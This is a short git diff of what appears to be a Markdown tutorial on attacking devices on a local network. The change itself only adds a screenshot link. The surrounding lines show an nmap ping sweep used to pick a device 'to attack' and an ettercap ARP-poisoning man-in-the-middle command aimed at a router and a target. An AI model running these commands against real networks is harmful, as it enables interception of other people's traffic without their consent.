@@ -39,6 +39,8 @@ sudo nmap -sn 192.168.1.0/24
 ```
 This will return all devices connected in the network and I can choose the one I want to attack
 
+![alt text](nmapscan.png)
+
 2. I'll run this command to start the attack 
 ```
 sudo ettercap -T -S -i wlan0 -M arp:remote /router_ip/ /target_ip/
